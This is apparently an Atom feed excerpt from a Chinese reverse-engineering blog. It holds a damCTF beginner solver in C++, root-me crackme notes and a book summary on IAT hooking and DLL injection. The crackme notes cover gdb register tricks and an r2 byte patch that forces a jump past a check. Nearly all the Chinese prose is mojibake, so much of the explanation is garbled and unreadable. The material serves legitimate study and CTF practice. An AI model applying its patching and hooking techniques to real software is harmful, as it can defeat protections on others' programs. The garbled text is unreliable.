class="comment">//291ä¸‹æœç´¢</span></span><br><span class="line">        <span class="keyword">int</span> qu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resu;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;  <span class="comment">//æœ€å¤§å…è®¸è¾“å…¥31ä¸ªå­—ç¬¦</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">58</span>;j++)&#123; <span class="comment">//ä»Aå¼€å§‹æœç´¢</span></span><br><span class="line">                        resu=v3^<span class="keyword">int</span>(<span class="string">'A'</span>+j);</span><br><span class="line">                        <span class="keyword">if</span>(resu==<span class="number">0</span>) <span class="comment">//==0æ²¡æœ‰ç”¨</span></span><br><span class="line">                                &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( resu&lt;remain || remain%resu==<span class="number">0</span>)&#123; <span class="comment">//å®é™…ä¸Šæ„Ÿè§‰ä¸ç”¨åŠ åé¢çš„æ¡ä»¶</span></span><br><span class="line">                                qu+=remain/resu; <span class="comment">//ç´¯è®¡å¾—åˆ°çš„å­—ç¬¦æ•°</span></span><br><span class="line">                                <span class="keyword">if</span>(qu&gt;<span class="number">31</span>)&#123; <span class="comment">//ä¸èƒ½å¤§äº31</span></span><br><span class="line">                                        qu-=remain/resu;</span><br><span class="line">                                        <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;remain/resu;k++) <span class="comment">//è¾“å‡ºæˆåŠŸçš„å­—ç¬¦</span></span><br><span class="line">                                        <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(<span class="string">'A'</span>+j);</span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                remain=remain%resu; <span class="comment">//æ›´æ–°ä½™ä¸‹å€¼</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">"i=  "</span>&lt;&lt;i&lt;&lt;<span class="string">"   "</span>&lt;&lt;<span class="string">"resu="</span>&lt;&lt;resu&lt;&lt;<span class="string">"qu= "</span>&lt;&lt;qu&lt;&lt;<span class="string">"remain="</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                i=qu<span class="number">-1</span>; <span class="comment">//æ›´æ–°i</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">"after i= "</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (remain==<span class="number">0</span>) <span class="comment">//å¡«æ»¡291 æˆåŠŸ</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">"find"</span>&lt;&lt;<span class="string">"i="</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=<span class="number">31</span>) <span class="comment">//æœ€åéƒ½æ²¡æœ‰æœç´¢åˆ°ï¼Œå¤±è´¥</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"don't find"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">"remainder= "</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥å­—ç¬¦ï¼ŒæˆåŠŸè§£é”ã€‚</p><p><img src="https://s1.ax1x.com/2020/10/12/0Rlsts.jpg" alt="0Rlsts.jpg" border="0"></p><p>æœ€åflagæ–‡ä»¶åœ¨è¿œç¨‹æœåŠ¡å™¨ï¼Œä½†é“¾æ¥æ—¶é—´å¾ˆçŸ­ï¼Œå¯èƒ½éœ€è¦è„šæœ¬è‡ªåŠ¨åŒ–å‘é€ï¼Œæœ‰ç‚¹å°éš¾ğŸ˜¢</p><hr><h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>C åº“å‡½æ•° char <em>fgets(char </em>str, int n, FILE *stream) ä»æŒ‡å®šçš„æµ stream è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å†…ã€‚å½“è¯»å– (n-1) ä¸ªå­—ç¬¦æ—¶ï¼Œæˆ–è€…è¯»å–åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼Œå®ƒä¼šåœæ­¢ï¼Œå…·ä½“è§†æƒ…å†µè€Œå®šã€‚</p><h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h4><p>C åº“å‡½æ•° size_t strlen(const char *str) è®¡ç®—å­—ç¬¦ä¸² str çš„é•¿åº¦ï¼Œç›´åˆ°ç©ºç»“æŸå­—ç¬¦ï¼Œä½†ä¸åŒ…æ‹¬ç©ºç»“æŸå­—ç¬¦ã€‚</p><h3 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h3><p>ä¸æ„§æ˜¯æ–°æ‰‹é¢˜ï¼Œåªæ˜¯æœ€åç¼–ç¨‹èŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;damCTF-rev-schlage-beginner-WP&quot;&gt;&lt;a href=&quot;#damCTF-rev-schlage-beginner-WP&quot; class=&quot;headerlink&quot; title=&quot;damCTF- rev/schlage (beginner) __WP&quot;&gt;&lt;/a&gt;damCTF- rev/schlage (beginner) __WP&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å…ˆç”¨&lt;code&gt;file&lt;/code&gt;å‘½ä»¤æŸ¥çœ‹&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg&quot; alt=&quot;0Rkyfe.jpg&quot; border=&quot;0&quot;&gt;&lt;br&gt;å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„ELFæ–‡ä»¶,debugä¿¡æ¯è¿˜åœ¨&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ¥ç€ä½¿ç”¨radare2åæ±‡ç¼–&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg&quot; alt=&quot;0RE8xJ.jpg&quot; border=&quot;0&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;VV&lt;/code&gt;å‘½ä»¤è¿›å…¥è§†å›¾æ¨¡å¼&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘_root_me_3</title>
    <link href="http://finsenty54.github.io/2020/10/08/%E9%80%86%E5%90%91_root_me_3/"/>
    <id>http://finsenty54.github.io/2020/10/08/é€†å‘_root_me_3/</id>
    <published>2020-10-08T12:21:43.000Z</published>
    <updated>2020-10-08T12:22:25.176Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-No-software-breakpoints"><a href="#ELF-x86-No-software-breakpoints" class="headerlink" title="ELF x86 - No software breakpoints"></a>ELF x86 - No software breakpoints</h2><h3 id="çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹"><a href="#çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹" class="headerlink" title="çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹"></a>çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹</h3><p>è¿™æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„<code>åè°ƒè¯•</code>æŠ€æœ¯ï¼Œå®ƒä¸èƒ½åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­<code>æ”¾ç½®ä»»ä½•è½¯ä»¶æ–­ç‚¹</code>ã€‚å› ä¸ºå½“æˆ‘ä»¬åœ¨<code>ç”¨æˆ·æ¨¡å¼</code>åº”ç”¨ç¨‹åºä¸­é‡åˆ°<code>æ–­ç‚¹</code>æ—¶ï¼Œä»£ç ä¸­å°†æ”¾å…¥<code>0xCCï¼ˆint3ï¼‰</code>ï¼Œå› æ­¤è®¡ç®—å°†æ˜¯é”™è¯¯çš„ï¼Œå¹¶å°†ç”Ÿæˆé”™è¯¯çš„<code>æ ¡éªŒå’Œ</code>.<br><a id="more"></a><br>è¿™æ˜¯åœ¨ecxä¸­è®¡ç®—ä¸€ç§æ•£åˆ—å€¼ï¼Œå®ƒåŸºäºå…¥å£ç‚¹çš„æ•´ä¸ªä»£ç ã€‚å¦‚æœæˆ‘ä»¬å¯¹å‡½æ•°è¿›è¡Œä»»ä½•æ›´æ”¹ï¼Œå€¼å°†ä¸å†ç›¸åŒï¼Œä»è€Œé˜»æ­¢æˆ‘ä»¬ç¼–è¾‘äºŒè¿›åˆ¶æ–‡ä»¶.</p><p>è®¡ç®—æ•´ä¸ª<code>text æŒ‡ä»¤çš„å’Œ</code>ï¼Œæ‰€ä»¥æ”¾å…¥<code>0xCC</code>ä¼š æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯æ”¹å˜çš„æŒ‡ä»¤ã€‚</p><hr><h3 id="ç§»ä½è¿ç®—ç¬¦"><a href="#ç§»ä½è¿ç®—ç¬¦" class="headerlink" title="ç§»ä½è¿ç®—ç¬¦"></a>ç§»ä½è¿ç®—ç¬¦</h3><p>a&lt;&lt;3<br><code>açš„å†…å®¹ä¸æ”¹å˜</code></p><p><code>edx &amp; 0xff</code><br>å–æœ€å8ä½</p><hr><h3 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h3><pre><code>g++ä¸»è¦ç”¨æ¥ç¼–è¯‘c++æ–‡ä»¶ï¼Œg++ç¼–è¯‘c++æ–‡ä»¶æ˜¯ä¼šè¿æ¥libc++ã€‚gccä¸»è¦ç”¨æ¥ç¼–è¯‘cæ–‡ä»¶ï¼Œä¹Ÿå¯ç¼–è¯‘c++ï¼Œä½†gccç¼–è¯‘c++æ–‡ä»¶é»˜è®¤ä¸è¿æ¥libc++ã€‚</code></pre><hr><h3 id="ç§»ä½"><a href="#ç§»ä½" class="headerlink" title="ç§»ä½"></a>ç§»ä½</h3><p>ç§»ä½æ—¶ï¼Œç§»å‡ºçš„ä½æ•°å…¨éƒ¨ä¸¢å¼ƒï¼Œç§»å‡ºçš„ç©ºä½è¡¥å…¥çš„æ•°ä¸å·¦ç§»è¿˜æ˜¯å³ç§»æœ‰å…³ã€‚å¦‚æœæ˜¯<code>å·¦ç§»</code>ï¼Œåˆ™è§„å®šè¡¥å…¥çš„æ•°å…¨éƒ¨æ˜¯<code>0</code>ï¼›å¦‚æœæ˜¯<code>å³ç§»</code>ï¼Œè¿˜ä¸è¢«ç§»ä½çš„æ•°æ®æ˜¯å¦å¸¦<code>ç¬¦å·</code>æœ‰å…³ã€‚è‹¥æ˜¯<code>ä¸å¸¦ç¬¦å·æ•°</code>ï¼Œåˆ™è¡¥å…¥çš„æ•°å…¨éƒ¨ä¸º<code>0</code>ï¼›è‹¥æ˜¯<code>å¸¦ç¬¦å·æ•°</code>ï¼Œåˆ™è¡¥å…¥çš„æ•°å…¨éƒ¨ç­‰äºåŸæ•°çš„æœ€å·¦ç«¯ä½ä¸Šçš„åŸæ•°(å³<code>åŸç¬¦å·ä½</code>)</p><hr><h3 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h3><p>å¼•å…¥äº†å‘½åç©ºé—´è¿™ä¸ªæ¦‚å¿µï¼Œå®ƒå¯ä½œä¸º<code>é™„åŠ ä¿¡æ¯æ¥åŒºåˆ†</code>ä¸åŒåº“ä¸­ç›¸åŒåç§°çš„å‡½æ•°ã€ç±»ã€å˜é‡ç­‰ã€‚ä½¿ç”¨äº†å‘½åç©ºé—´å³å®šä¹‰äº†ä¸Šä¸‹æ–‡ã€‚æœ¬è´¨ä¸Šï¼Œå‘½åç©ºé—´å°±æ˜¯å®šä¹‰äº†<code>ä¸€ä¸ªèŒƒå›´</code>ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>using namespace</code> æŒ‡ä»¤ï¼Œè¿™æ ·åœ¨ä½¿ç”¨å‘½åç©ºé—´æ—¶å°±å¯ä»¥<code>ä¸ç”¨åœ¨å‰é¢åŠ ä¸Š</code>å‘½åç©ºé—´çš„åç§°ã€‚è¿™ä¸ªæŒ‡ä»¤ä¼šå‘Šè¯‰ç¼–è¯‘å™¨ï¼Œåç»­çš„ä»£ç å°†ä½¿ç”¨æŒ‡å®šçš„å‘½åç©ºé—´ä¸­çš„åç§°ã€‚</p><hr><h2 id="ELF-x86-CrackPass"><a href="#ELF-x86-CrackPass" class="headerlink" title="ELF x86 - CrackPass"></a>ELF x86 - CrackPass</h2><p><code>gdb-peda$ help x</code><br>Examine memory: x/FMT ADDRESS.</p><hr><p><code>gdb-peda$ print/t $ebx</code><br>äºŒè¿›åˆ¶æ‰“å°å¯„å­˜å™¨</p><hr><pre><code>set $ZF = 6set $eflags |= (1 &lt;&lt; $ZF)</code></pre><p>è®¾å®šZFå€¼ä¸º1</p><hr><p><code>show</code></p><hr><p><code>where</code><br>æ˜¾ç¤ºå½“å‰ä½ç½®</p><hr><p><code>MOVZX</code> æŒ‡ä»¤ï¼ˆè¿›è¡Œå…¨é›¶æ‰©å±•å¹¶ä¼ é€ï¼‰å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶æŠŠç›®çš„æ“ä½œæ•° æ‰©å±•åˆ° 16 ä½æˆ– 32 ä½ã€‚</p><hr><h3 id="r2-å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°"><a href="#r2-å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°" class="headerlink" title="r2 å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°"></a>r2 å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°</h3><p>å›¾å½¢æ¨¡å¼ä¸‹ï¼ŒæŒ‰<code>o</code>è¿›è¡Œè·³è½¬<br>æŒ‰<code>u</code>è¿”å›ä¸Šä¸€ä¸ªå‡½æ•°</p><hr><p>ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9</p><p>25260060504_VE_T25_<em>t</em>_</p><hr><p><code>Usage: jump LOCATION</code><br>Give as argument either LINENUM or *ADDR, where ADDR is an express</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ELF-x86-No-software-breakpoints&quot;&gt;&lt;a href=&quot;#ELF-x86-No-software-breakpoints&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - No software breakpoints&quot;&gt;&lt;/a&gt;ELF x86 - No software breakpoints&lt;/h2&gt;&lt;h3 id=&quot;çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹&quot;&gt;&lt;/a&gt;çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹&lt;/h3&gt;&lt;p&gt;è¿™æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„&lt;code&gt;åè°ƒè¯•&lt;/code&gt;æŠ€æœ¯ï¼Œå®ƒä¸èƒ½åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­&lt;code&gt;æ”¾ç½®ä»»ä½•è½¯ä»¶æ–­ç‚¹&lt;/code&gt;ã€‚å› ä¸ºå½“æˆ‘ä»¬åœ¨&lt;code&gt;ç”¨æˆ·æ¨¡å¼&lt;/code&gt;åº”ç”¨ç¨‹åºä¸­é‡åˆ°&lt;code&gt;æ–­ç‚¹&lt;/code&gt;æ—¶ï¼Œä»£ç ä¸­å°†æ”¾å…¥&lt;code&gt;0xCCï¼ˆint3ï¼‰&lt;/code&gt;ï¼Œå› æ­¤è®¡ç®—å°†æ˜¯é”™è¯¯çš„ï¼Œå¹¶å°†ç”Ÿæˆé”™è¯¯çš„&lt;code&gt;æ ¡éªŒå’Œ&lt;/code&gt;.&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘_root_me_2</title>
    <link href="http://finsenty54.github.io/2020/10/07/%E9%80%86%E5%90%91_root_me_2/"/>
    <id>http://finsenty54.github.io/2020/10/07/é€†å‘_root_me_2/</id>
    <published>2020-10-07T06:27:22.000Z</published>
    <updated>2020-10-07T06:29:06.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é€†å‘-root-me"><a href="#é€†å‘-root-me" class="headerlink" title="é€†å‘ root_me"></a>é€†å‘ root_me</h2><h3 id="PE-NET"><a href="#PE-NET" class="headerlink" title="PE .NET"></a>PE .NET</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection</a></p><a id="more"></a><h3 id="MIPS-ELF-MIPS-Basic-Crackme"><a href="#MIPS-ELF-MIPS-Basic-Crackme" class="headerlink" title="MIPS. ELF MIPS - Basic Crackme"></a>MIPS. ELF MIPS - Basic Crackme</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme</a></p><p>åœ¨MIPSæ¶æ„ä¸­ï¼Œâ€œ $ raâ€å¯„å­˜å™¨ä¿å­˜è¿”å›åœ°å€ï¼Œç±»ä¼¼äºx86æŒ‡ä»¤æŒ‡é’ˆâ€œ EIPâ€</p><h3 id="ELF-fake-instrucations"><a href="#ELF-fake-instrucations" class="headerlink" title="ELF  fake instrucations"></a>ELF  fake instrucations</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints</a></p><pre><code>dis main  gdb-peda$ set disassembly-flavor intel //æ±‡ç¼–ç”¨intelè¯­è¨€æ˜¾ç¤ºgdb-peda$ i r $edx //æ˜¾ç¤ºedxå€¼ni //ni/siéƒ½æ˜¯æ±‡ç¼–çº§åˆ«çš„æ–­ç‚¹å®šä½ã€‚siä¼šè¿›å…¥æ±‡ç¼–å’ŒCå‡½æ•°å†…éƒ¨,niä¸ä¼š//è¿™ä¸¤ä¸ªå‘½ä»¤ï¼ˆsi/niï¼‰æ‰€é’ˆå¯¹çš„æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œè€Œs/né’ˆå¯¹çš„æ˜¯æºä»£ç </code></pre><p><code>jz</code> è¡¨ç¤ºå½“<code>zf =1</code>æ—¶è·³è½¬ï¼Œå³ç»“æœä¸º0è·³è½¬ã€‚<br><code>jnz</code> å³ <code>zf=0</code>æ—¶è·³è½¬ï¼Œå³ç»“æœä¸ä¸º0 è·³è½¬ã€‚</p><pre><code>gdb-peda$ i r //å…¨æ˜¾ç¤ºgdb-peda$ set $eax=0gdb-peda$ x/s $eax //æŸ¥çœ‹å¯„å­˜å™¨æŒ‡å‘çš„å†…å®¹call WPA(&quot;toto&quot;, &quot;toto&quot;) //ç›´æ¥åœ¨gdbä¸­è¿è¡Œå‘½ä»¤ï¼Ÿï¼Ÿ</code></pre><h3 id="ELF-ptrace"><a href="#ELF-ptrace" class="headerlink" title="ELF ptrace"></a>ELF ptrace</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace</a></p><p><em>Load the application into <code>IDA pro</code>,search main function,press <code>F5</code>to disassemble it,get the code below:</em><br><code>IDA æŒ‰F5 åç¼–è¯‘ ç”Ÿæˆä¼ªä»£ç </code></p><hr><p><code>r2 -ww ./ch3.bin</code></p><pre><code>-w           open file in write modeww foobar            write wide string &apos;f\x00o\x00o\x00b\x00a\x00r\x00&apos;wx 9090     write two intel nops</code></pre><p><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code><br>Short Jumpï¼ˆçŸ­è·³è½¬ï¼‰æœºå™¨ç  EB</p><p><code>pd N             disassemble N instructions</code></p><pre><code>gdb-peda$ i b set $al=$dl </code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é€†å‘-root-me&quot;&gt;&lt;a href=&quot;#é€†å‘-root-me&quot; class=&quot;headerlink&quot; title=&quot;é€†å‘ root_me&quot;&gt;&lt;/a&gt;é€†å‘ root_me&lt;/h2&gt;&lt;h3 id=&quot;PE-NET&quot;&gt;&lt;a href=&quot;#PE-NET&quot; class=&quot;headerlink&quot; title=&quot;PE .NET&quot;&gt;&lt;/a&gt;PE .NET&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary</title>
    <link href="http://finsenty54.github.io/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/"/>
    <id>http://finsenty54.github.io/2020/10/06/é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary/</id>
    <published>2020-10-06T06:18:05.000Z</published>
    <updated>2020-10-06T06:19:13.677Z</updated>
    
    <content type="html"><![CDATA[<h3 id="INT-å’Œ-IAT"><a href="#INT-å’Œ-IAT" class="headerlink" title="INT å’Œ IAT"></a>INT å’Œ IAT</h3><p>INT  æ˜¯rvaæ•°ç»„ï¼ŒINTè¡¨ç¤ºæ•°ç»„é¦–åœ°å€ æ•°ç»„å…ƒç´ æ˜¯ä¸€ä¸ªåœ°å€ æŒ‡å‘ç”±ä¸€ä¸ª2å­—èŠ‚ordinallåœ°å€å’Œå‡½æ•°åç§°ç»„æˆçš„ç»“æ„ä½“  ç¬¬ä¸€ä¸ªå€¼åœ°å€æŒ‡å‘ç¬¬ä¸€ä¸ªç»“æ„ä½“</p><p>å¦‚æœIATå­˜åœ¨äº é€‰æ‹©å¤´ä¸­IATè¡¨æ˜çš„åœ°å€ä¸­ ç›¸åº”æ²¡æœ‰å†™æƒé™ä¹Ÿæ²¡äº‹</p><p>INTå’ŒIATæŒ‡å‘å†…å®¹æœ‰æ—¶ç›¸åŒ è¡¨ç¤ºåœ°å€è‚¯å®šä¸åŒ å› ä¸ºä¿å­˜åœ¨ä¸åŒåœ°å€ æ‰€æŒ‡å†…å®¹ç›¸åŒ</p><a id="more"></a><hr><h3 id="è¿›ç¨‹å†…å­˜è½¬å‚¨"><a href="#è¿›ç¨‹å†…å­˜è½¬å‚¨" class="headerlink" title="è¿›ç¨‹å†…å­˜è½¬å‚¨"></a>è¿›ç¨‹å†…å­˜è½¬å‚¨</h3><p>OLLYGDBæ’ä»¶ï¼Ÿï¼Ÿ dumpå‘½ä»¤<br>æ˜¯è§£å‹ç¼©è¿è¡Œæ—¶ï¼Œå°†å†…å­˜è½¬ä¸ºæ–‡ä»¶ï¼Œæ–¹ä¾¿æŸ¥çœ‹</p><hr><h3 id="ä»£ç æ³¨å…¥"><a href="#ä»£ç æ³¨å…¥" class="headerlink" title="ä»£ç æ³¨å…¥"></a>ä»£ç æ³¨å…¥</h3><p>ä½¿ç”¨CALLæŒ‡ä»¤å°†æ¥ä¸‹æ¥çš„åœ¨ä»£ç é—´çš„å­—ç¬¦ä¸²æ•°æ®åœ°å€å‹å…¥æ ˆï¼Œç„¶åç›´æ¥æ¥ä¸‹æ¥è¿è¡Œå‘½ä»¤</p><p>CALL EAX<br>EAXä¿å­˜å‡½æ•°åœ°å€<br>32ä½ä¿å­˜è¿”å›å†…å®¹</p><hr><h3 id="top-å‘½ä»¤-linux"><a href="#top-å‘½ä»¤-linux" class="headerlink" title="top å‘½ä»¤ (linux)"></a>top å‘½ä»¤ (linux)</h3><p>æŸ¥çœ‹ CPU æ—¶é—´åœ¨ User space ä¸ Kernel Space ä¹‹é—´çš„åˆ†é…æƒ…å†µ</p><hr><h3 id="SEHé“¾"><a href="#SEHé“¾" class="headerlink" title="SEHé“¾"></a>SEHé“¾</h3><p>ollydbg VIEW-SEH CHAIN</p><hr><h3 id="APIé’©å–"><a href="#APIé’©å–" class="headerlink" title="APIé’©å–"></a>APIé’©å–</h3><p>windows ä¸­å†…æ ¸æ¨¡å¼æ‰€æœ‰ä»£ç å…±ç”¨ä¸€ä¸ªè™šæ‹Ÿç©ºé—´åœ°å€ï¼Œç”¨APIä¼ <br>e1 = 9Fh =&gt; 0fh*2^7 = 780h</p><p>ä½¿ç”¨å¸¸è§„ç³»ç»Ÿèµ„æºçš„APIä¼šç»ç”±kernel32.dllå’Œntdll.dllä¸æ–­å‘ä¸‹è°ƒç”¨ï¼Œæœ€åç»ç”±SYSENTERå‘½ä»¤è¿›å…¥å†…æ ¸æ¨¡å¼</p><p><img src="https://s1.ax1x.com/2020/10/06/0N35f1.png" alt="0N35f1.png"></p><hr><p><img src="https://s1.ax1x.com/2020/10/06/0N3vtA.png" alt="0N3vtA.png"></p><hr><h3 id="åŠ¨æ€æ–¹æ³•å¸¸ç”¨-è°ƒè¯•å’Œæ³¨å…¥"><a href="#åŠ¨æ€æ–¹æ³•å¸¸ç”¨-è°ƒè¯•å’Œæ³¨å…¥" class="headerlink" title="åŠ¨æ€æ–¹æ³•å¸¸ç”¨ è°ƒè¯•å’Œæ³¨å…¥"></a>åŠ¨æ€æ–¹æ³•å¸¸ç”¨ è°ƒè¯•å’Œæ³¨å…¥</h3><h4 id="æ–¹æ³•1ï¼šè°ƒè¯•"><a href="#æ–¹æ³•1ï¼šè°ƒè¯•" class="headerlink" title="æ–¹æ³•1ï¼šè°ƒè¯•"></a>æ–¹æ³•1ï¼šè°ƒè¯•</h4><p>å¼‚å¸¸å¿…é¡»å¤„ç†ä¸ºEXCEPTION_BREAKPOINT æ±‡ç¼–æŒ‡ä»¤ä¸ºint 3 IA-32æŒ‡ä»¤ä¸º0xCC </p><p>ç”¨å¼‚å¸¸è·å–APIçš„æ§åˆ¶</p><p>çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼Œï¼ˆæ‰§è¡Œå®Œä¸€ä¸ªçº¿ç¨‹æ—¶é—´ç‰‡ï¼Œæ‰§è¡Œå¦ä¸€ä¸ªï¼‰ï¼Œä¹Ÿå°±æ˜¯å„ä¸ªå¯„å­˜å™¨ä¿¡æ¯ï¼Œä¿å­˜åœ¨CONTEXTç»“æ„ä½“ä¸­ã€‚</p><p>CONTEXT.esp</p><p>apié’©å– è·å–æŸä¸ªAPIçš„æ§åˆ¶æƒ</p><h4 id="æ–¹æ³•2ï¼šDLLæ³¨å…¥"><a href="#æ–¹æ³•2ï¼šDLLæ³¨å…¥" class="headerlink" title="æ–¹æ³•2ï¼šDLLæ³¨å…¥"></a>æ–¹æ³•2ï¼šDLLæ³¨å…¥</h4><p>setwindowstextA è¡¨ç¤ºASCII<br>setwindowstextW è¡¨ç¤ºå®½å­—ç¬¦ winä¸­ä¸ºUnicodeç </p><h3 id="IATé’©å–"><a href="#IATé’©å–" class="headerlink" title="IATé’©å–"></a>IATé’©å–</h3><p>é€šè¿‡æ³¨å…¥DLLï¼Œä¿®æ”¹IATä¸­æŒ‡å‘æŸAPIçš„åœ°å€æ”¹ä¸ºæŒ‡å‘è‡ªå·±APIçš„åœ°å€ï¼Œè‡ªå·±çš„å‡½æ•°å†å»è°ƒç”¨æŸAPIï¼Œæ¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„</p><hr><h3 id="æœç´¢API"><a href="#æœç´¢API" class="headerlink" title="æœç´¢API"></a>æœç´¢API</h3><p><strong>åœ¨ç”¨ollydngè¿›è¡Œå†…éƒ¨æ¨¡å—call 